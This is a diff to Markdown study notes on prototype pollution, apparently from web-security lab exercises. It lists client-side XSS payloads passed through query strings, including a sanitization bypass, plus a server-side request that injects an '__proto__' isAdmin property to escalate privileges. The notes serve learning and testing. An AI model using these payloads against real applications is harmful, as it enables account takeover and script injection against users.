@@ -5343,7 +5343,7 @@ Prototype pollution is a JavaScript vulnerability that enables an attacker to ad
     - Burp>Proxy>open browser>upper top right Burp Icon> select "DOM invader on" + enable "attack types: prototype pollution" > reload
     - DOM Invader panel: click "scan for gadgets" > scan complete
     - DOM Invader panel: click "exploit"  
-- ** DOM XSS** via an alternative prototype pollution vector
+- **DOM XSS** via an alternative prototype pollution vector
   - `/?__proto__.sequence=alert(1)-`
 - Client-side prototype pollution via **flawed sanitization**
   - `/?__pro__proto__to__[transport_url]=data:,alert(1);`
@@ -5358,24 +5358,20 @@ Prototype pollution is a JavaScript vulnerability that enables an attacker to ad
 - Client-side prototype pollution via browser **APIs**
   - `/?__proto__[value]=data:,alert(1);`
 - **Privilege escalation** via server-side prototype pollution
-- In Repeater `POST /my-account/change-address`, add a new property to the JSON with the name __proto__. Noticed that object in the response now includes the arbitrary property that you injected, but no __proto__ property.   
-  ```
-  Request
-  {
-  "address_line_1":"Wiener HQ",
-  "address_line_2":"One Wiener Way",
-  "city":"Wienerville",
-  "postcode":"BU1 1RP",
-  "country":"UK",
-  "sessionId":"EndBvgxnm9aG78AhZx8nkXg5WZ7FSeQj",
-   "__proto__": {
-    "isAdmin":"true"
-    }
-  }
+  - In Repeater `POST /my-account/change-address`, add a new property to the JSON with the name __proto__. Noticed that object in the response now includes the arbitrary property that you injected, but no __proto__ property.   
+    ```
+    Request
+    {
+      "address_line_1":"Wiener HQ",
+      ...
+      "__proto__": {
+         "isAdmin":"true"
+      }
+     }
 
-  Response
-  {"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":true,"foo":"bar"}  
-  ``` 
+     Response
+     {"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":true,"foo":"bar"}  
+     ``` 
 - dd
 - dd
 - dd
